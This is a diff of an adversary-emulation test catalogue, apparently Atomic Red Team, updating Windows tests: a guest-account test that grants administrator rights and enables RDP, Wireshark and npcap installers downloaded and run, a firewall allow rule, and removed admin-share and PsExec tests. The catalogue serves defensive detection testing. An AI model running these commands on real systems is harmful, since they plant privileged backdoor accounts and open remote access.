@@ -2467,18 +2467,27 @@ privilege-escalation:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -11712,18 +11721,27 @@ persistence:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -21471,11 +21489,19 @@ credential-access:
         wireshark_url:
           description: wireshark installer download URL
           type: url
-          default: https://2.na.dl.wireshark.org/win64/Wireshark-win64-3.2.6.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
           type: path
           default: c:\program files\wireshark\tshark.exe
+        npcap_url:
+          description: npcap installed download URL
+          type: url
+          default: https://nmap.org/npcap/dist/npcap-1.31.exe
+        npcap_path:
+          description: path to npcap.sys
+          type: path
+          default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
       - description: 'tshark must be installed and in the default path of "c:\Program
@@ -21486,6 +21512,13 @@ credential-access:
         get_prereq_command: |
           Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
           Start-Process $env:temp\wireshark_installer.exe /S
+      - description: 'npcap must be installed.
+
+'
+        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
+          Start-Process $env:temp\npcap_installer.exe
       executor:
         command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
 
@@ -28845,18 +28878,27 @@ defense-evasion:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -29507,23 +29549,13 @@ defense-evasion:
           description: path to exe file
           type: path
           default: PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'exe file must exist on disk in users folder
-
-'
-        prereq_command: 'if (Get-Item "C:\Users\$env:UserName\AtomicTest.exe") {exit
-          0} else {exit 1}
-
-'
-        get_prereq_command: 'Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName"
-
-'
       executor:
-        command: netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow
-          program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
-        cleanup_command: netsh advfirewall firewall delete rule name="Atomic Test"
-          | Out-Null
+        command: |
+          Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName" -Force
+          netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
+        cleanup_command: |
+          netsh advfirewall firewall delete rule name="Atomic Test" | Out-Null
+          Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
         name: powershell
         elevation_required: true
   T1562.001:
@@ -47282,11 +47314,19 @@ discovery:
         wireshark_url:
           description: wireshark installer download URL
           type: url
-          default: https://2.na.dl.wireshark.org/win64/Wireshark-win64-3.2.6.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
           type: path
           default: c:\program files\wireshark\tshark.exe
+        npcap_url:
+          description: npcap installed download URL
+          type: url
+          default: https://nmap.org/npcap/dist/npcap-1.31.exe
+        npcap_path:
+          description: path to npcap.sys
+          type: path
+          default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
       - description: 'tshark must be installed and in the default path of "c:\Program
@@ -47297,6 +47337,13 @@ discovery:
         get_prereq_command: |
           Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
           Start-Process $env:temp\wireshark_installer.exe /S
+      - description: 'npcap must be installed.
+
+'
+        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
+          Start-Process $env:temp\npcap_installer.exe
       executor:
         command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
 
@@ -57353,109 +57400,7 @@ lateral-movement:
       - SMB enabled; Host/network firewalls not blocking SMB ports between source
         and destination; Use of domain account in administrator group on remote system
         or default system admin account.
-      identifier: T1021.002
-    atomic_tests:
-    - name: Map admin share
-      auto_generated_guid: 3386975b-367a-4fbb-9d77-4dcf3639ffd3
-      description: 'Connecting To Remote Shares
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_name:
-          description: Username
-          type: String
-          default: DOMAIN\Administrator
-        share_name:
-          description: Examples C$, IPC$, Admin$
-          type: String
-          default: C$
-        password:
-          description: Password
-          type: String
-          default: P@ssw0rd1
-        computer_name:
-          description: Target Computer Name
-          type: String
-          default: Target
-      executor:
-        command: 'cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password}
-          /u:#{user_name}"
-
-'
-        name: command_prompt
-    - name: Map Admin Share PowerShell
-      auto_generated_guid: 514e9cd7-9207-4882-98b1-c8f791bae3c5
-      description: 'Map Admin share utilizing PowerShell
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        share_name:
-          description: Examples C$, IPC$, Admin$
-          type: String
-          default: C$
-        map_name:
-          description: Mapped Drive Letter
-          type: String
-          default: g
-        computer_name:
-          description: Target Computer Name
-          type: String
-          default: Target
-      executor:
-        command: 'New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
-
-'
-        name: powershell
-    - name: Copy and Execute File with PsExec
-      auto_generated_guid: 0eb03d41-79e4-4393-8e57-6344856be1cf
-      description: 'Copies a file to a remote host and executes it using PsExec. Requires
-        the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        command_path:
-          description: File to copy and execute
-          type: Path
-          default: C:\Windows\System32\cmd.exe
-        remote_host:
-          description: Remote computer to receive the copy and execute the file
-          type: String
-          default: "\\\\localhost"
-      executor:
-        command: 'psexec.exe #{remote_host} -accepteula -c #{command_path}
-
-'
-        name: command_prompt
-        elevation_required: true
-    - name: Execute command writing output to local Admin Share
-      auto_generated_guid: d41aaab5-bdfe-431d-a3d5-c29e9136ff46
-      description: |
-        Executes a command, writing the output to a local Admin Share.
-        This technique is used by post-exploitation frameworks.
-      supported_platforms:
-      - windows
-      input_arguments:
-        output_file:
-          description: Remote computer to receive the copy and execute the file
-          type: String
-          default: output.txt
-        command_to_execute:
-          description: Command to execute for output.
-          type: String
-          default: hostname
-      executor:
-        command: 'cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file}
-          2>&1
-
-'
-        name: command_prompt
-        elevation_required: true
+    atomic_tests: []
   T1021.004:
     technique:
       external_references:
@@ -61156,9 +61101,11 @@ exfiltration:
           exit 0; fi;
 
 '
-        get_prereq_command: "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
-          touch #{folder_path}/safe_to_delete; fi;      \ndd if=/dev/urandom of=#{folder_path}/#{file_name}
-          bs=25000000 count=1\n"
+        get_prereq_command: 'if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
+          touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name}
+          bs=25000000 count=1
+
+'
       executor:
         command: |
           cd #{folder_path}; split -b 5000000 #{file_name}
@@ -62283,18 +62230,27 @@ initial-access:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
